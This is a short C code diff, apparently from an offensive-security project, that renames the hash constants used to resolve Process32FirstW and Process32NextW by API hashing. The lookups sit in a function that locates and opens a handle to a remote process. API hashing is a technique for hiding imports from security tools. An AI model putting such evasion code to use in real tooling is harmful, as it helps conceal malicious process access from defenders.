@@ -1,5 +1,4 @@
 #include "utils.h"
-#include "../modules/stealth_techniques/api_hashing.h"
 
 // Define function pointer types for Process32FirstW and Process32NextW
 typedef BOOL (WINAPI *PProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
@@ -31,7 +30,7 @@ BOOL GetRemoteProcessHandleWinAPI(LPWSTR szProcessName, DWORD* dwProcessId, HAND
 	}
 
 	// Get Process32FirstW address using API hashing
-	PProcess32FirstW pProcess32FirstW_func = (PProcess32FirstW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), Process32FirstW_JOAA);
+	PProcess32FirstW pProcess32FirstW_func = (PProcess32FirstW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_HASH), Process32FirstW_HASH);
 	if (!pProcess32FirstW_func) {
 		DebugPrint("[!] Failed to get Process32FirstW address through API Hashing\n");
 		pProcess32FirstW_func = (PProcess32FirstW)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Process32FirstW");
@@ -80,7 +79,7 @@ BOOL GetRemoteProcessHandleWinAPI(LPWSTR szProcessName, DWORD* dwProcessId, HAND
 		// Get Process32NextW address using API hashing (only once before the loop)
 		static PProcess32NextW pProcess32NextW_func = NULL;
 		if (!pProcess32NextW_func) {
-			pProcess32NextW_func = (PProcess32NextW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), Process32NextW_JOAA);
+			pProcess32NextW_func = (PProcess32NextW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_HASH), Process32NextW_HASH);
 			if (!pProcess32NextW_func) {
 				DebugPrint("[!] Failed to get Process32NextW address through API Hashing\n");
 				pProcess32NextW_func = (PProcess32NextW)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Process32NextW");
